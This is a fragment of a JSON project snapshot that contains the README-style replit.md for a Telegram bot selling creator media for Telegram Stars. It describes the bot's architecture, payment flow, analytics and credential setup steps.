\"requests>=2.32.5\",\n]\n","size_bytes":336},"replit.md":{"content":"# Overview\n\nThis is a professional Telegram bot designed for content creators who monetize their content through Telegram Stars. The bot serves as a complete fan engagement and content management platform, allowing creators to sell media content, interact with fans through AI-style responses, and manage their community directly through Telegram chat without needing external tools or interfaces.\n\nThe bot provides a dual interface: fans can browse teasers, purchase content with Telegram Stars, and have natural conversations, while content creators get comprehensive admin controls for content management, user analytics, and automated interactions.\n\n# Recent Changes\n\n**September 18, 2025 - Complete Replit Environment Setup**\n- ✅ Successfully configured Flask web server to run on 0.0.0.0:5000 with webview output\n- ✅ Database initialization working properly with SQLite (content_bot.db) - existing data preserved\n- ✅ Health endpoints working at / and /health for monitoring\n- ✅ Production deployment configured with Gunicorn for VM target to maintain persistent operation\n- ✅ Web-only mode implemented - Flask server runs even without Telegram credentials\n- ✅ Error handling improved for graceful degradation when bot tokens are missing\n- ⚠️ **REQUIRED SETUP**: Add BOT_TOKEN and OWNER_ID to Replit Secrets to enable full Telegram bot functionality\n\n**September 17, 2025 - Initial Replit Environment Setup**\n- Successfully configured the Telegram bot to run in Replit environment\n- Set up required secrets: BOT_TOKEN and OWNER_ID through Replit Secrets\n- Bot polling and Flask server running concurrently via threading\n\n# User Preferences\n\nPreferred communication style: Simple, everyday language.\n\n# System Architecture\n\n## Bot Framework and Hosting\n- **pyTelegramBotAPI (telebot)**: Core bot framework for handling Telegram API interactions\n- **Flask**: Minimal web server to maintain bot presence on Replit hosting platform\n- **Threading**: Separates Flask server and bot polling to ensure continuous operation\n- **Environment Variables**: Secure storage of BOT_TOKEN and OWNER_ID through Replit Secrets\n\n## Data Layer\n- **SQLite Database**: Local file-based storage solution chosen for simplicity and zero-configuration deployment\n- **Database Schema Design**:\n  - Users table: Tracks fan demographics, spending history, and engagement metrics\n  - Content items table: Stores purchasable content with pricing and file references\n  - Responses table: Key-value store for AI-style conversational responses\n  - Scheduled posts table: Time-based content delivery system\n  - Loyal fans table: Creator-defined fan recognition system\n\n## Payment Processing\n- **Telegram Stars Integration**: Native Telegram cryptocurrency for seamless in-chat transactions\n- **Invoice Generation**: Automated billing system with `bot.send_invoice` using XTR currency\n- **Payment Workflow**: Handles pre-checkout validation and successful payment processing\n- **Automatic Content Delivery**: Post-payment content distribution with user statistics updates\n\n## User Interface Design\n- **Command-Based Interaction**: Structured commands for specific actions (/start, /buy, /teaser)\n- **Inline Keyboard Buttons**: Visual interface elements for common actions\n- **Natural Language Fallback**: AI-style responses for conversational messages outside command structure\n- **Dual Permission System**: Separate command sets for regular users and content creator (owner)\n\n## Content Management System\n- **In-Chat Administration**: Complete bot management through Telegram messages, eliminating need for external interfaces\n- **Dynamic Content Addition**: Real-time content catalog updates without code modifications\n- **File Handling**: Support for various media types through file paths or URLs\n- **Scheduled Publishing**: Time-based content release system with datetime parsing\n\n## Analytics and User Management\n- **User Activity Tracking**: Comprehensive interaction logging and spending analysis\n- **Loyalty System**: Creator-defined fan recognition with custom tagging\n- **User Lifecycle Management**: User deletion and recovery with backup functionality\n- **Engagement Analytics**: Stars earned tracking, top fan identification, and interaction metrics\n\n# External Dependencies\n\n## Telegram API\n- **Telegram Bot API**: Core messaging and bot functionality through official API\n- **Telegram Stars**: Native payment processing system for content monetization\n- **Webhook/Polling**: Bot communication method with Telegram servers\n\n## Python Libraries\n- **pyTelegramBotAPI (telebot)**: Primary bot framework for Telegram integration\n- **Flask**: Web server framework for Replit hosting compatibility\n- **sqlite3**: Built-in Python library for database operations\n- **threading**: Standard library for concurrent operation management\n- **datetime**: Time handling for scheduling and analytics\n- **logging**: Error tracking and debugging information\n- **os**: Environment variable access for secure configuration\n\n## Hosting Platform\n- **Replit**: Cloud hosting platform with integrated environment variable management\n- **Replit Secrets**: Secure storage system for sensitive configuration data (BOT_TOKEN, OWNER_ID)\n\n## File Storage\n- **Local File System**: Media content storage on hosting platform\n- **URL References**: Support for external content hosting through direct links\n\n# Setup Instructions\n\n## Current Status\n✅ **Web Server**: Ready and running - the Flask application is operational  \n✅ **Database**: SQLite database initialized and working  \n✅ **Deployment**: Configured for production with Gunicorn  \n⚠️ **Telegram Bot**: Requires credentials to be fully functional  \n\n## To Enable Full Telegram Bot Functionality\n\nThe application is currently running in **web-only mode**. To enable the complete Telegram bot features, you need to:\n\n### 1. Create a Telegram Bot\n- Message @BotFather on Telegram\n- Use the `/newbot` command\n- Follow the instructions to get your **BOT_TOKEN**\n\n### 2. Get Your Telegram User ID\n- Message @userinfobot on Telegram to get your **OWNER_ID** (your Telegram user ID number)\n\n### 3. Add Secrets in Replit\n- Go to the \"Secrets\" tab in your Replit environment (lock icon in sidebar)\n- Add these secrets:\n  - `BOT_TOKEN`: Your bot token from BotFather\n  - `OWNER_ID`: Your Telegram user ID number\n\n### 4. Restart the Application\nOnce you've added the secrets, the application will automatically restart and detect the new credentials.\n\n## Current Functionality Without Bot Credentials\n- ✅ Web server health monitoring at `/` and `/health` endpoints\n- ✅ Database operations and content management system\n- ✅ All backend logic and data structures\n- ❌ Telegram bot commands and messaging (requires credentials)","size_bytes":6754}},"version":1}